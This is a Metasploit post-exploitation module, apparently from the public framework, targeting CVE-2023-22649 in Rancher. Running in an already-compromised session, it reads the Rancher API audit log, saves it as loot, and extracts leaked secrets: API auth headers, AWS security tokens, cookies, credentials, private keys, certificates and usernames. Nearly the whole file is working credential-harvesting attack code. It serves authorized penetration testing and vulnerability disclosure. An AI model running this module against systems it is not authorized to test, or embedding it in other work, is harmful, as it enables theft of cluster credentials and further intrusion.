##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Rancher Audit Log Sensitive Information Leak',
        'Description' => %q{
          Rancher versions between 2.6.0-2.6.13, 2.7.0-2.7.9, 2.8.0-2.8.1 inclusive
          contain a vulnerability where sensitive data is leaked into the audit logs.
          Rancher Audit Logging is an opt-in feature, only deployments that have it
          enabled and have AUDIT_LEVEL set to 1 or above are impacted by this issue.

          Tested against rancher 2.6.0.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die', # msf module
        ],
        'Platform' => ['linux', 'unix'],
        'SessionTypes' => ['shell', 'meterpreter'],
        'References' => [
          [ 'URL', 'https://github.com/rancher/rancher/security/advisories/GHSA-xfj7-qf8w-2gcr'],
          [ 'URL', 'https://ranchermanager.docs.rancher.com/how-to-guides/advanced-user-guides/enable-api-audit-log#api-audit-log-options'],
          [ 'CVE', '2023-22649']
        ],
        'DisclosureDate' => '2024-02-08',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )
    register_advanced_options [
      OptString.new('LOGFILE', [ true, 'The log file to analyze', '/var/log/auditlog/rancher-api-audit.log' ])
    ]
  end

  def run
    # docker install, and default path according to https://ranchermanager.docs.rancher.com/how-to-guides/advanced-user-guides/enable-api-audit-log#api-audit-log-options
    fail_with Failure::BadConfig, "#{datastore['LOGFILE']} is not readable or not found" unless readable?(datastore['LOGFILE'])

    log = read_file(datastore['LOGFILE'])
    loot = store_loot('rancher.api.log', 'text/plain', session, log, 'rancher.api.txt', 'Rancher API Log')
    print_good("Rancher log saved to: #{loot}")

    usernames_found = []
    table = Rex::Text::Table.new('Header' => 'Leaked Information', 'Indent' => 1, 'Columns' => ['Field', 'Value', 'Location'])

    log.each_line do |line|
      leaky_request_headers = ['X-Api-Auth-Header', 'X-Amz-Security-Token']
      leaky_response_headers = ['X-Api-Set-Cookie-Header']
      leaky_request_body = ['credentials', 'applicationSecret', 'oauthCredential', 'serviceAccountCredential', 'spKey', 'spCert', 'certificate', 'privateKey']

      json_line = JSON.parse(line)

      if json_line.key? 'requestHeader'
        leaky_request_headers.each do |leaky_field|
          next unless json_line['requestHeader'].key? leaky_field

          secret = json_line['requestHeader'][leaky_field]
          secret = secret.join(' ') if secret.is_a?(Array)
          print_good("Found #{leaky_field} #{secret}")
          table << [leaky_field, secret, 'requestHeader']
        end
      end

      if json_line.key? 'responseHeader'
        leaky_response_headers.each do |leaky_field|
          next unless json_line['responseHeader'].key? leaky_field

          secret = json_line['responseHeader'][leaky_field]
          secret = secret.join(' ') if secret.is_a?(Array)
          print_good("Found #{leaky_field}: #{secret}")
          table << [leaky_field, secret, 'responseHeader']
        end
      end

      if json_line.key? 'requestBody'
        leaky_request_body.each do |leaky_field|
          next unless json_line['requestBody'].key? leaky_field

          secret = json_line['requestBody'][leaky_field]
          secret = secret.join(' ') if secret.is_a?(Array)
          print_good("Found #{leaky_field} in #{secret}")
          table << [leaky_field, secret, 'requestBody']
        end
      end

      if json_line.key? 'responseBody'
        leaky_request_body.each do |leaky_field|
          next unless json_line['responseBody'].key? leaky_field

          secret = json_line['responseBody'][leaky_field]
          secret = secret.join(' ') if secret.is_a?(Array)
          print_good("Found #{leaky_field} in #{secret}")
          table << [leaky_field, secret, 'responseBody']
        end
      end

      usernames = json_line.dig('user', 'extra', 'username')
      next if usernames.nil?

      usernames_found += usernames
    end

    usernames_found.uniq.each do |username|
      table << ['Username', username, 'Requests']
    end

    print_line
    print_line(table.to_s)
  end
end
